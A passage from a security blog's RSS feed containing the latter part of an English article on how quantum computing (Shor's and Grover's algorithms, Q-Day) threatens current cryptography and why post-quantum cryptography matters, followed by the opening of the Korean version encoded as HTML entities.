alt></p><blockquote><p>Source: &#x201C;Concise Insights into Quantum Machine Learning and Its Practical Uses&#x201D; (Sanati &amp; Borzoei, 2024, DOI: 10.13140/RG.2.2.14216.64002)</p></blockquote><h3 id="2-1-Quantum-Superposition"><a href="#2-1-Quantum-Superposition" class="headerlink" title="2.1 Quantum Superposition"></a>2.1 Quantum Superposition</h3><p>Quantum superposition is one of the most fundamental properties of quantum computers, referring to the phenomenon where <strong>a single qubit can exist in multiple states simultaneously</strong>. As explained earlier, while classical computers execute calculations sequentially along &#x2018;one path,&#x2019; quantum computers perform calculations in parallel by &#x2018;exploring multiple paths simultaneously.&#x2019;</p><p>For example, with 10 qubits, a quantum computer can simultaneously consider 2^10 = 1024 states in a single operation. This parallelism enables computational efficiency far surpassing classical methods!</p><p>However, qubits in superposition states are highly sensitive to external environments and can easily collapse due to factors like noise or decoherence. Therefore, the biggest challenge in practical quantum computer implementation is how stably these superposition states can be maintained.</p><h3 id="2-2-Quantum-Entanglement"><a href="#2-2-Quantum-Entanglement" class="headerlink" title="2.2 Quantum Entanglement"></a>2.2 Quantum Entanglement</h3><p>Quantum entanglement is the phenomenon where two or more qubits become bound together in a state where they are not independent. That is, <strong>if the state of one qubit changes, the state of another entangled qubit also changes instantly</strong>. Einstein famously questioned this phenomenon, calling it &#x201C;spooky action at a distance.&#x201D; However, experiments like Bell&#x2019;s inequality tests and those by Alain Aspect (1982) later proved its existence.</p><p>In quantum computers, this entanglement enables simultaneous processing of computational dependencies between qubits. Entanglement allows operations to be connected in parallel, and by leveraging the correlation of information, specific computational results can be amplified or unnecessary outcomes eliminated, thereby strengthening the pattern leading to the correct answer. For example, measuring one qubit in an entangled pair automatically determines the state of the other qubit. This property enables advanced operations like information transfer, state control, and error correction.</p><p>This entanglement phenomenon forms the basis for quantum computers to implement logically connected computational networks beyond mere parallel processing.</p><h3 id="2-3-Quantum-Interference"><a href="#2-3-Quantum-Interference" class="headerlink" title="2.3 Quantum Interference"></a>2.3 Quantum Interference</h3><p>Quantum interference strengthens the probability of the path leading to the correct answer among multiple paths in a superposition state, while weakening the probability of incorrect paths.</p><p>Quantum algorithms are designed to intentionally manipulate this interference so that the correct result is ultimately observed with a higher probability. For example, Grover&#x2019;s algorithm repeatedly enhances the probability of the correct solution among all possible solutions. This allows finding the correct answer among N pieces of data in O(&#x221A;n) time using a quantum algorithm, compared to O(N) time using classical methods.</p><p>If quantum superposition broadens the scope of computation, quantum interference can be seen as a filter that retains only the correct answer within that scope.</p><h2 id="3-Quantum-Algorithms"><a href="#3-Quantum-Algorithms" class="headerlink" title="3. Quantum Algorithms"></a>3. Quantum Algorithms</h2><p>The properties of quantum computers we&#x2019;ve examined&#x2014;superposition, entanglement, and interference&#x2014;are not merely &#x2018;fascinating physical phenomena&#x2019;. Utilizing these properties allows us to solve problems that are difficult for classical computers to tackle, far more efficiently.</p><p>Representative examples demonstrating the potential of quantum computation are Shor&#x2019;s algorithm and Grover&#x2019;s algorithm. While these algorithms weren&#x2019;t created &#x201C;to break classical cryptography,&#x201D; their computational principles ultimately undermined the security of the cryptographic systems we currently use.</p><h3 id="3-1-Shor&#x2019;s-Algorithm"><a href="#3-1-Shor&#x2019;s-Algorithm" class="headerlink" title="3.1 Shor&#x2019;s Algorithm"></a>3.1 Shor&#x2019;s Algorithm</h3><p>Shor&#x2019;s algorithm, proposed by Peter Shor in 1994, can perform <strong>polynomial-time integer factorization</strong>. On classical computers, factoring large numbers becomes incredibly difficult; breaking a 2048-bit RSA key would take billions of years, making it practically impossible. However, Shor&#x2019;s algorithm proved that using a quantum computer, this can be done in polynomial time.</p><p>The operating principle is somewhat complex, but simply put, it uses the quantum Fourier transform to rapidly identify the periodicity within a sequence. Knowing this periodicity allows one to naturally find the prime factors through the information revealed.</p><p><img src="/2025/10/12/bekim/quantum_computer/en/image3.png" alt></p><p>This diagram is a simplified circuit representing the basic structure of Shor&#x2019;s algorithm. The qubits on the left initialize the input state and create a superposition state using the Hadamard gate (H). Next, each qubit performs a different Ua^{2^{n-1}} operation, reflecting the sequence&#x2019;s periodicity to obtain phase information. Finally, applying the inverse quantum Fourier transform (QFT&#x207B;&#xB9;) converts this into a form where the periodicity information can be measured.</p><p>Honestly, this part is hard to explain simply. I once got a B+ on a quantum cryptography exam question proving Shor&#x2019;s algorithm quantum circuit.</p><p>Anyway, why is this important? Because **almost all public-key cryptosystems like RSA, Diffie&#x2013;Hellman, and ECDSA operate on the assumption that &#x2018;factoring is difficult&#x2019;. In other words, if Shor&#x2019;s algorithm becomes practical, it could threaten the internet security we rely on today.</p><p>Of course, it&#x2019;s theoretically very powerful, but in reality, we haven&#x2019;t yet implemented enough stable logical qubits. So, while it&#x2019;s not at the level of breaking RSA immediately, the fact that it might be possible someday is why academia is actively researching the transition to post-quantum cryptography (PQC). PQC is another major topic, so I&#x2019;ll cover it later if the opportunity arises.</p><h3 id="3-2-Grover&#x2019;s-Algorithm"><a href="#3-2-Grover&#x2019;s-Algorithm" class="headerlink" title="3.2 Grover&#x2019;s Algorithm"></a>3.2 Grover&#x2019;s Algorithm</h3><p>Grover&#x2019;s algorithm is <strong>an algorithm that efficiently finds a specific item in an unordered database</strong>. If we were to find the answer to a problem by trying every possible case one by one, the classical approach would require an average of N/2 attempts for N candidates to find the correct answer. However, a quantum computer can find the correct answer in approximately &#x221A;N attempts using Grover&#x2019;s algorithm. This is possible because quantum computers utilize superposition and interference.</p><p>Grover&#x2019;s algorithm simultaneously superimposes all possible states, enabling all candidates to participate in the computation at once. It then applies an oracle operation that flips the phase only of the correct state, repeating this process while using interference to amplify the probability amplitude of the correct answer. Finally, when measured, the state with the highest probability of being correct remains.</p><p>This characteristic makes Grover&#x2019;s algorithm highly applicable across various fields, such as large-scale database searches and machine learning problems.</p><p>However, it simultaneously poses a threat capable of halving the security strength of symmetric-key cryptography or hash-based systems. For instance, while a classical computer requires 2^128 attempts to brute-force an AES-128 cipher, calculations show a quantum computer could achieve this in just 2^64 attempts.</p><p>While Grover&#x2019;s algorithm doesn&#x2019;t directly break public-key cryptography like Shor&#x2019;s algorithm does, it clearly demonstrated that quantum computers threaten not only public-key cryptography but also symmetric-key cryptography. Therefore, the security industry <strong>recommends using long keys like AES-256</strong>. Even considering Grover attacks, AES-256 remains sufficiently secure.</p><h2 id="4-Q-day"><a href="#4-Q-day" class="headerlink" title="4. Q-day"></a>4. Q-day</h2><p>No one can accurately predict when <strong>Q-Day (Quantum Day)</strong>&#x2014;the day quantum computers can actually decrypt current cryptography&#x2014;will arrive. However, we are currently in the NISQ (Noisy Intermediate-Scale Quantum) era.</p><p>It is literally the noisy intermediate-scale quantum computer era. While leading global IT companies have implemented hundreds of qubits, they remain unstable with high error rates, insufficient to break RSA. It&#x2019;s known that breaking RSA-2048 completely requires tens of millions of stable logical qubits, yet current hardware mostly remains at the level of hundreds of physical qubits.</p><p>Furthermore, error correction technology&#x2014;which groups multiple physical qubits to create a single logical qubit&#x2014;is still in the research phase. Therefore, we can consider this an era of learning how to operate quantum computers reliably.</p><p>Nevertheless, there is no disagreement that Q-Day <strong>will inevitably arrive someday</strong>. Governments and major institutions have already begun preparing for that moment. The U.S. National Institute of Standards and Technology (NIST) is driving the standardization of <strong>Post-Quantum Cryptography (PQC)</strong> and finalized its first set of candidate standards in 2024. The European Union, Korea&#x2019;s KISA, Japan&#x2019;s NICT, and others are also preparing accordingly.</p><p><img src="/2025/10/12/bekim/quantum_computer/en/image4.png" alt></p><blockquote><p>Source: IMARC Group</p></blockquote><p>As governments and companies worldwide prepare for quantum threats, the quantum-resistant cryptography (PQC) market is also experiencing explosive growth. According to IMARC Group, the PQC market is projected to grow from approximately $300 million in 2024 to around $9.4 billion by 2033.</p><p>This article aims to explain the relationship between quantum computers and cryptography as simply as possible. If the opportunity arises, we&#x2019;ll explore what quantum-resistant cryptography (PQC) entails and why it&#x2019;s hailed as a core technology for the &#x201C;post-quantum era.&#x201D;</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/bekim/">bekim</category>
      
      <category domain="https://hackyboiz.github.io/tags/crypto/">crypto</category>
      
      <category domain="https://hackyboiz.github.io/tags/quantum/">quantum</category>
      
      <category domain="https://hackyboiz.github.io/tags/quantumcomputing/">quantumcomputing</category>
      
      
      <comments>https://hackyboiz.github.io/2025/10/12/bekim/quantum_computer/en/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] The Quantum Threat to Classical Security (ko)</title>
      <link>https://hackyboiz.github.io/2025/10/12/bekim/quantum_computer/ko/</link>
      <guid>https://hackyboiz.github.io/2025/10/12/bekim/quantum_computer/ko/</guid>
      <pubDate>Sun, 12 Oct 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;1-&amp;#xC11C;&amp;#xB860;&quot;&gt;&lt;a href=&quot;#1-&amp;#xC11C;&amp;#xB860;&quot; class=&quot;headerlink&quot; title=&quot;1. &amp;#xC11C;&amp;#xB860;&quot;&gt;&lt;/a&gt;1. &amp;#xC11C;&amp;#xB860;&lt;/h2&gt;&lt;p&gt;&amp;#xC</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="1-&#xC11C;&#xB860;"><a href="#1-&#xC11C;&#xB860;" class="headerlink" title="1. &#xC11C;&#xB860;"></a>1. &#xC11C;&#xB860;</h2><p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694;! &#xC624;&#xB298;&#xC740; &#xC7A0;&#xC2DC; &#xC26C;&#xC5B4;&#xAC08; &#xACB8; &#xC591;&#xC790;&#xCEF4;&#xD4E8;&#xD130; &#xC774;&#xC57C;&#xAE30;&#xB97C; &#xD574;&#xBCF4;&#xB824;&#xACE0; &#xD574;&#xC694;. &#xCD5C;&#xADFC; &#xBA87; &#xB144; &#xC0AC;&#xC774; &#xC591;&#xC790;&#xCEF4;&#xD4E8;&#xD130; &#xAE30;&#xC220;&#xC774; &#xBE60;&#xB974;&#xAC8C; &#xBC1C;&#xC804;&#xD558;&#xBA74;&#xC11C;, &#xC6B0;&#xB9AC;&#xAC00; &#xC624;&#xB7AB;&#xB3D9;&#xC548; &#xC548;&#xC804;&#xD558;&#xB2E4;&#xACE0; &#xBBFF;&#xC5B4;&#xC654;&#xB358; &#xAE30;&#xC874; &#xC554;&#xD638;&#xCCB4;&#xACC4;&#xAC00; &#xC704;&#xD611; &#xBC1B;&#xB294;&#xB2E4;&#xACE0; &#xBCF4;&#xACE0;&#xC788;&#xC5B4;&#xC694;.</p><p>&#xADF8; &#xC774;&#xC720;&#xB294;, &#xB300;&#xBD80;&#xBD84;&#xC758; &#xC554;&#xD638;&#xAC00; &#x2018;&#xACC4;&#xC0B0;&#xC774; &#xC5B4;&#xB835;&#xB2E4;&#x2019;&#xB294; &#xAC00;&#xC815; &#xC704;&#xC5D0; &#xC138;&#xC6CC;&#xC838; &#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC774;&#xC5D0;&#xC694;. &#xC608;&#xB97C; &#xB4E4;&#xC5B4; RSA&#xB294; &#x201C;&#xD070; &#xC218;&#xB294; &#xC18C;&#xC778;&#xC218;&#xBD84;&#xD574;&#xD558;&#xAE30; &#xC5B4;&#xB835;&#xB2E4;&#x201D; &#xB294; &#xC810;&#xC5D0;, ECDHE&#xB294; &#x201C;&#xD0C0;&#xC6D0;&#xACE1;&#xC120; &#xC704;&#xC5D0;&#xC11C; &#xC774;&#xC0B0;&#xB85C;&#xADF8;&#xB97C; &#xACC4;&#xC0B0;&#xD558;&#xAE30; &#xC5B4;&#xB835;&#xB2E4;&#x201D;&#xB294; &#xC810;&#xC5D0; &#xAE30;&#xBC18;&#xD558;&#xC8E0;. &#xD558;&#xC9C0;&#xB9CC; &#xC591;&#xC790; &#xCEF4;&#xD4E8;&#xD130;&#xB294; &#xC774;&#xB7F0; &#xACC4;&#xC0B0;&#xC744; &#xAE30;&#xC874; &#xCEF4;&#xD4E8;&#xD130;&#xBCF4;&#xB2E4; &#xBE60;&#xB974;&#xAC8C; &#xC218;&#xD589;&#xD560; &#xC218; &#xC788;&#xC5B4;&#xC694;.</p><p>&#xC774;&#xB294; &#xC591;&#xC790; &#xC911;&#xCCA9;(superposition)&#xACFC; &#xC591;&#xC790; &#xC5BD;&#xD798;(entanglement)&#xC774;&#xB77C;&#xB294; &#xD2B9;&#xC131; &#xB355;&#xBD84;&#xC5D0; &#xD55C; &#xBC88;&#xC758; &#xC5F0;&#xC0B0;&#xC5D0; &#xC5EC;&#xB7EC; &#xACBD;&#xB85C;&#xB97C; &#xB3D9;&#xC2DC;&#xC5D0; &#xACE0;&#xB824;&#xD560; &#xC218; &#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC785;&#xB2C8;&#xB2E4;. &#xADF8; &#xACB0;&#xACFC;, &#xC9C0;&#xAE08;&#xAE4C;&#xC9C0; &#x201C;&#xC0AC;&#xC2E4;&#xC0C1; &#xBD88;&#xAC00;&#xB2A5;&#xD558;&#xB2E4;&#x201D;&#xACE0; &#xC5EC;&#xACA8;&#xC84C;&#xB358; &#xC554;&#xD638; &#xD574;&#xB3C5;&#xC774; &#xC774;&#xB860;&#xC801;&#xC73C;&#xB85C;&#xB294; &#xAC00;&#xB2A5;&#xD574;&#xC84C;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/10/12/bekim/quantum_computer/ko/image.png" alt></p><p>&#xC774;&#xCC98;&#xB7FC; &#xC591;&#xC790;&#xCEF4;&#xD4E8;&#xD130;&#xAC00; &#xD604;&#xC7AC;&#xC758; &#xC554;&#xD638;&#xB97C; &#xD574;&#xB3C5;&#xD560; &#xC218; &#xC788;&#xB294; &#xC2DC;&#xC810;&#xC744; <strong>Q-Day(Quantum Day)</strong> &#xB77C;&#xACE0; &#xBD80;&#xB985;&#xB2C8;&#xB2E4;. Q-Day&#xAC00; &#xC815;&#xD655;&#xD788; &#xC5B8;&#xC81C; &#xC62C;&#xC9C0;&#xB294; &#xBAA8;&#xB974;&#xC9C0;&#xB9CC;, IBM, Google, &#xC544;&#xC774;&#xC628;&#xD050;, &#xC2F8;&#xC774;&#xD000;&#xD140; &#xB4F1; &#xC8FC;&#xC694; &#xAE30;&#xC5C5;&#xB4E4;&#xC774; &#xC218;&#xBC31; &#xD050;&#xBE44;&#xD2B8; &#xAE09; &#xC591;&#xC790; &#xCEF4;&#xD4E8;&#xD130;&#xB97C; &#xAD6C;&#xD604;&#xD558;&#xAE30; &#xC704;&#xD574; &#xB178;&#xB825;&#xD558;&#xB294; &#xB9CC;&#xD07C;, IT&#xC5C5;&#xACC4;&#xC5D0;&#xC11C;&#xB294; Q-Day&#xB97C; &#xB2E8;&#xC21C;&#xD55C; &#xAC00;&#xC815;&#xC774; &#xC544;&#xB2CC; &#xD604;&#xC2E4;&#xC801;&#xC778; &#xB9AC;&#xC2A4;&#xD06C;&#xB85C; &#xC5EC;&#xAE30;&#xACE0; &#xC788;&#xC5B4;&#xC694;.</p><p>&#xB530;&#xB77C;&#xC11C; &#xC624;&#xB298;&#xC740; &#xC591;&#xC790; &#xCEF4;&#xD4E8;&#xD130;&#xC758; &#xAE30;&#xBCF8;&#xC801;&#xC778; &#xD2B9;&#xC131;&#xACFC;, &#xC774; &#xCEF4;&#xD4E8;&#xD130;&#xAC00; &#xAE30;&#xC874; &#xC554;&#xD638;&#xB97C; &#xD574;&#xB3C5;&#xD558;&#xB294; &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC5D0; &#xB300;&#xD574; &#xB2E4;&#xB904;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. &#xCD5C;&#xB300;&#xD55C; &#xC774;&#xD574;&#xD558;&#xAE30; &#xC27D;&#xAC8C; &#xC124;&#xBA85;&#xD574;&#xBCFC;&#xAC8C;&#xC694;!</p><h2 id="2-&#xC591;&#xC790;&#xCEF4;&#xD4E8;&#xD130;"><a href="#2-&#xC591;&#xC790;&#xCEF4;&#xD4E8;&#xD130;" class="headerlink" title="2. &#xC591;&#xC790;&#xCEF4;&#xD4E8;&#xD130;"></a>2. &#xC591;&#xC790;&#xCEF4;&#xD4E8;&#xD130;</h2><p>&#xC591;&#xC790; &#xCEF4;&#xD4E8;&#xD130;&#xB294; &#xAE30;&#xC874;&#xC758; &#xB514;&#xC9C0;&#xD138; &#xCEF4;&#xD4E8;&#xD130;&#xC640;&#xB294; &#xC804;&#xD600; &#xB2E4;&#xB978; &#xC6D0;&#xB9AC;&#xB85C; &#xC791;&#xB3D9;&#xD574;&#xC694;. &#xAE30;&#xC874; &#xCEF4;&#xD4E8;&#xD130;&#xB294; &#xC804;&#xAE30;&#xC801; &#xC2E0;&#xD638;&#xC778; 0&#xACFC; 1&#xC774;&#xB77C;&#xB294; 2&#xAC00;&#xC9C0; &#xC0C1;&#xD0DC;&#xB85C; &#xC815;&#xBCF4;&#xB85C; &#xD45C;&#xD604;&#xD558;&#xC9C0;&#xB9CC;, &#xC591;&#xC790; &#xCEF4;&#xD4E8;&#xD130;&#xB294; &#x2018;&#xD050;&#xBE44;&#xD2B8;(Qubit)&#x2019;&#xB77C;&#xB294; &#xB2E8;&#xC704;&#xB85C; &#xC815;&#xBCF4;&#xB97C; &#xD45C;&#xD604;&#xD574;&#xC694;.</p><p>&#xD050;&#xBE44;&#xD2B8;&#xB294; &#xB2E8;&#xC21C;&#xD788; 0 &#xB610;&#xB294; 1 &#xC911; &#xD558;&#xB098;&#xC758; &#xAC12;&#xB9CC; &#xAC00;&#xC9C0;&#xB294; &#xAC83;&#xC774; &#xC544;&#xB2C8;&#xB77C;, &#xC591;&#xC790; &#xC911;&#xCCA9;(superposition) &#xC0C1;&#xD0DC;&#xB97C; &#xD1B5;&#xD574; 0&#xACFC; 1&#xC774; &#xB3D9;&#xC2DC;&#xC5D0; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xC0C1;&#xD0DC;&#xAC00; &#xB420; &#xC218; &#xC788;&#xC5B4;&#xC694;. &#xC774;&#xB85C; &#xC778;&#xD574; &#xC591;&#xC790; &#xCEF4;&#xD4E8;&#xD130;&#xB294; &#xAE30;&#xC874; &#xCEF4;&#xD4E8;&#xD130;&#xC640; &#xB2EC;&#xB9AC; &#xBCD1;&#xB82C;&#xC801; &#xC5F0;&#xC0B0;&#xC774; &#xAC00;&#xB2A5;&#xD574;&#xC9D1;&#xB2C8;&#xB2E4;.</p><p>&#xC218;&#xD559;&#xC801;&#xC73C;&#xB85C; &#xD050;&#xBE44;&#xD2B8;&#xC758; &#xC0C1;&#xD0DC;&#xB294; &#xC544;&#xB798;&#xCC98;&#xB7FC; &#xD45C;&#xD604;&#xD560; &#xC218; &#xC788;&#xC5B4;&#xC694;</p><p><img src="/2025/10/12/bekim/quantum_computer/ko/image1.png" alt></p><p>&#xC5EC;&#xAE30;&#xC11C; &#x3B1;&#xC640; &#x3B2;&#xB294; &#xD655;&#xB960; &#xC9C4;&#xD3ED;(probability amplitude)&#xC73C;&#xB85C;, &#xC774; &#xB450; &#xAC12;&#xC740; &#xD56D;&#xC0C1; &#x2223;&#x3B1;&#x2223;^2 + &#x2223;&#x3B2;&#x2223;^2 =1&#xC758; &#xAD00;&#xACC4;&#xB97C; &#xB9CC;&#xC871;&#xD574;&#xC694;. &#xC989;, &#xD050;&#xBE44;&#xD2B8;&#xB294; &#x201C;0&#xC77C; &#xD655;&#xB960;(&#x2223;&#x3B1;&#x2223;^2)&#x201D;&#xACFC; &#x201C;1&#xC77C; &#xD655;&#xB960;(&#x2223;&#x3B2;&#x2223;^2)&#x201D;&#xC744; &#xB3D9;&#xC2DC;&#xC5D0; &#xD488;&#xC740; &#xC0C1;&#xD0DC;&#xB85C; &#xC874;&#xC7AC;&#xD55C;&#xB2E4;&#xB294; &#xB73B;&#xC785;&#xB2C8;&#xB2E4;. &#xC774; &#xC0C1;&#xD0DC;&#xB294; &#xC6B0;&#xB9AC;&#xAC00; &#xCE21;&#xC815;&#xD558;&#xAE30; &#xC804;&#xAE4C;&#xC9C0; &#xD655;&#xB960;&#xC801;&#xC73C;&#xB85C; &#xC874;&#xC7AC;&#xD558;&#xACE0;, &#xCE21;&#xC815;&#xC774; &#xC774;&#xB8E8;&#xC5B4;&#xC9C0;&#xBA74; &#xD558;&#xB098;&#xC758; &#xAC12;&#xC774; &#xB418;&#xBBC0;&#xB85C;, &#xC774; &#xC0C1;&#xD0DC;&#xB294; &#xBD95;&#xAD34;&#xB429;&#xB2C8;&#xB2E4;. </p><p>&#xC774;&#xB7EC;&#xD55C; &#xD2B9;&#xC131; &#xB355;&#xBD84;&#xC5D0; &#xC591;&#xC790; &#xCEF4;&#xD4E8;&#xD130;&#xB294; &#xD55C; &#xBC88;&#xC758; &#xC5F0;&#xC0B0;&#xC73C;&#xB85C;, &#xACE0;&#xC804; &#xCEF4;&#xD4E8;&#xD130;&#xAC00; &#xC21C;&#xCC28;&#xC801;&#xC73C;&#xB85C; &#xACC4;&#xC0B0;&#xD574;&#xC57C;&#xD558;&#xB294; &#xC5EC;&#xB7EC; &#xACBD;&#xC6B0;&#xB97C; &#xB3D9;&#xC2DC;&#xC5D0; &#xD0D0;&#xC0C9;&#xD560; &#xC218; &#xC788;&#xC5B4;&#xC694;. &#xB530;&#xB77C;&#xC11C; &#xC591;&#xC790; &#xCEF4;&#xD4E8;&#xD130;&#xB294; &#xD2B9;&#xC815; &#xBB38;&#xC81C;(ex. &#xC18C;&#xC778;&#xC218;&#xBD84;&#xD574;, &#xCD5C;&#xC801;&#xD654;, &#xAC80;&#xC0C9; &#xB4F1;&#xB4F1;..)&#xC5D0;&#xC11C; &#xACE0;&#xC804; &#xCEF4;&#xD4E8;&#xD130;&#xBCF4;&#xB2E4; &#xD6E8;&#xC52C; &#xBE60;&#xB978; &#xACC4;&#xC0B0; &#xC18D;&#xB3C4;&#xB97C; &#xB0BC; &#xC218; &#xC788;&#xC5B4;&#xC694;.</p><p><img src="/2025/10/12/bekim/quantum_computer/ko/image2.png" alt></p><blockquote><p>Source: &#x201C;Concise Insights into Quantum Machine Learning and Its Practical Uses&#x201D; (Sanati &amp; Borzoei, 2024, DOI: 10.13140/RG.2.2.14216.64002)</p></blockquote><h3 id="2-1-&#xC591;&#xC790;-&#xC911;&#xCCA9;-Superposition"><a href="#2-1-&#xC591;&#xC790;-&#xC911;&#xCCA9;-Superposition" class="headerlink" title="2.1 &#xC591;&#xC790; &#xC911;&#xCCA9; (Superposition)"></a>2.1 &#xC591;&#xC790; &#xC911;&#xCCA9; (Superposition)</h3><p>&#xC591;&#xC790; &#xC911;&#xCCA9;&#xC740; &#xC591;&#xC790;&#xCEF4;&#xD4E8;&#xD130;&#xC758; &#xAC00;&#xC7A5; &#xD575;&#xC2EC;&#xC801;&#xC778; &#xD2B9;&#xC131; &#xC911; &#xD558;&#xB098;&#xB85C;, <strong>&#xD558;&#xB098;&#xC758; &#xD050;&#xBE44;&#xD2B8;&#xAC00; &#xB3D9;&#xC2DC;&#xC5D0; &#xC5EC;&#xB7EC; &#xC0C1;&#xD0DC;&#xB97C; &#xAC00;&#xC9C8; &#xC218; &#xC788;&#xB294; &#xD604;&#xC0C1;</strong>&#xC744; &#xB9D0;&#xD574;&#xC694;. &#xC704;&#xC5D0;&#xC11C; &#xC124;&#xBA85;&#xD588;&#xB4EF;&#xC774;, &#xACE0;&#xC804; &#xCEF4;&#xD4E8;&#xD130;&#xAC00; &#x2018;&#xD558;&#xB098;&#xC758; &#xAE38;&#x2019;&#xC744; &#xB530;&#xB77C; &#xC21C;&#xC11C;&#xB300;&#xB85C; &#xACC4;&#xC0B0;&#xC744; &#xC2E4;&#xD589;&#xD55C;&#xB2E4;&#xBA74;, &#xC591;&#xC790; &#xCEF4;&#xD4E8;&#xD130;&#xB294; &#x2018;&#xC5EC;&#xB7EC; &#xAE38;&#xC744; &#xB3D9;&#xC2DC;&#xC5D0; &#xD0D0;&#xC0C9;&#x2019;&#xD558;&#xBA74;&#xC11C; &#xBCD1;&#xB82C;&#xC801;&#xC73C;&#xB85C; &#xACC4;&#xC0B0;&#xC744; &#xC218;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC608;&#xB97C; &#xB4E4;&#xC5B4;&#xC11C;, 10&#xAC1C;&#xC758; &#xD050;&#xBE44;&#xB4DC;&#xAC00; &#xC788;&#xB2E4;&#xBA74;, &#xC591;&#xC790; &#xCEF4;&#xD4E8;&#xD130;&#xB294; &#xB2E8; &#xD55C; &#xBC88;&#xC758; &#xC5F0;&#xC0B0;&#xC73C;&#xB85C; 2^10 = 1024&#xAC1C;&#xC758; &#xC0C1;&#xD0DC;&#xB97C; &#xB3D9;&#xC2DC;&#xC5D0; &#xACE0;&#xB824;&#xD560; &#xC218; &#xC788;&#xC5B4;&#xC694;. &#xC774;&#xB7EC;&#xD55C; &#xBCD1;&#xB82C;&#xC131;&#xC740; &#xACE0;&#xC804;&#xC801; &#xBC29;&#xC2DD;&#xBCF4;&#xB2E4; &#xD6E8;&#xC52C; &#xBE60;&#xB978; &#xACC4;&#xC0B0; &#xD6A8;&#xC728;&#xC744; &#xB9CC;&#xB4E4;&#xC5B4; &#xB0BC; &#xC218; &#xC788;&#xACA0;&#xC8E0;!</p><p>&#xD558;&#xC9C0;&#xB9CC; &#xC911;&#xCCA9; &#xC0C1;&#xD0DC;&#xC758; &#xD050;&#xBE44;&#xD2B8;&#xB294; &#xC678;&#xBD80; &#xD658;&#xACBD;&#xC5D0; &#xB9E4;&#xC6B0; &#xBBFC;&#xAC10;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; noise(&#xC7A1;&#xC74C;)&#xB098; decoherence(&#xC591;&#xC790; &#xACB0; &#xC5B4;&#xAE0B;&#xB0A8;) &#xAC19;&#xC740; &#xC694;&#xC778;&#xC5D0; &#xC758;&#xD574; &#xC27D;&#xAC8C; &#xAE68;&#xC9C8; &#xC218; &#xC788;&#xC5B4;&#xC694;. &#xB530;&#xB77C;&#xC11C; &#xC2E4;&#xC9C8;&#xC801;&#xC778; &#xC591;&#xC790; &#xCEF4;&#xD4E8;&#xD130; &#xAD6C;&#xD604;&#xC5D0;&#xC11C;&#xB294; &#xC911;&#xCCA9; &#xC0C1;&#xD0DC;&#xB97C; &#xC5BC;&#xB9C8;&#xB098; &#xC548;&#xC815;&#xC801;&#xC73C;&#xB85C; &#xC720;&#xC9C0;&#xD558;&#xB290;&#xB0D0;&#xAC00; &#xAC00;&#xC7A5; &#xD070; &#xCC4C;&#xB9B0;&#xC9C0;&#xC5D0;&#xC694;.</p><h3 id="2-2-&#xC591;&#xC790;-&#xC5BD;&#xD798;-Entanglement"><a href="#2-2-&#xC591;&#xC790;-&#xC5BD;&#xD798;-Entanglement" class="headerlink" title="2.2 &#xC591;&#xC790; &#xC5BD;&#xD798; (Entanglement)"></a>2.2 &#xC591;&#xC790; &#xC5BD;&#xD798; (Entanglement)</h3><p>&#xC591;&#xC790; &#xC5BD;&#xD798;&#xC740; &#xB450; &#xAC1C; &#xC774;&#xC0C1;&#xC758; &#xD050;&#xBE44;&#xD2B8;&#xAC00; &#xC11C;&#xB85C; &#xB3C5;&#xB9BD;&#xC801;&#xC774;&#xC9C0; &#xC54A;&#xC740; &#xC0C1;&#xD0DC;&#xB85C; &#xBB36;&#xC774;&#xB294; &#xD604;&#xC0C1;&#xC785;&#xB2C8;&#xB2E4;. &#xC989;, &#xD558;<strong>&#xB098;&#xC758; &#xD050;&#xBE44;&#xD2B8;&#xC758; &#xC0C1;&#xD0DC;&#xAC00; &#xBC14;&#xB00C;&#xBA74;, &#xADF8;&#xC640; &#xC5BD;&#xD78C; &#xB2E4;&#xB978; &#xD050;&#xBE44;&#xD2B8;&#xC758; &#xC0C1;&#xD0DC;&#xB3C4; &#xC989;&#xC2DC; &#xBCC0;&#xD654;</strong>&#xD55C;&#xB2E4;&#xB294; &#xAC70;&#xC8E0;. &#xC544;&#xC778;&#xC288;&#xD0C0;&#xC778;&#xC740; &#xC774; &#xD604;&#xC0C1;&#xC744; &#xB450;&#xACE0; Spooky action at a distance(&#xC73C;&#xC2A4;&#xC2A4;&#xD55C; &#xC6D0;&#xACA9; &#xC791;&#xC6A9;)&#xB77C;&#xBA70; &#xC758;&#xBB38;&#xC744; &#xC81C;&#xAE30;&#xD588;&#xC9C0;&#xB9CC; &#xC774;&#xD6C4;, &#xBCA8;(Bell)&#xC758; &#xBD80;&#xB4F1;&#xC2DD; &#xC2E4;&#xD5D8;&#xACFC; &#xC544;&#xC2A4;&#xD399;&#xD2B8;(Alain Aspect, 1982) &#xB4F1;&#xC758; &#xC2E4;&#xD5D8;&#xC744; &#xD1B5;&#xD574; &#xC774; &#xD604;&#xC0C1;&#xC5D0; &#xC2E4;&#xC81C;&#xB85C; &#xC874;&#xC7AC;&#xD55C;&#xB2E4;&#xB294; &#xAC83;&#xC774; &#xC785;&#xC99D;&#xB418;&#xC5C8;&#xC5B4;&#xC694;.</p><p>&#xC591;&#xC790; &#xCEF4;&#xD4E8;&#xD130;&#xC5D0;&#xC11C;&#xB294; &#xC774; &#xC5BD;&#xD798;&#xC744; &#xC774;&#xC6A9;&#xD574;&#xC11C; &#xD050;&#xBE44;&#xD2B8; &#xAC04;&#xC758; &#xACC4;&#xC0B0; &#xC758;&#xC874;&#xC131;&#xC744; &#xB3D9;&#xC2DC;&#xC5D0; &#xCC98;&#xB9AC;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC5BD;&#xD798;&#xC744; &#xC774;&#xC6A9;&#xD574; &#xC5F0;&#xC0B0;&#xC774; 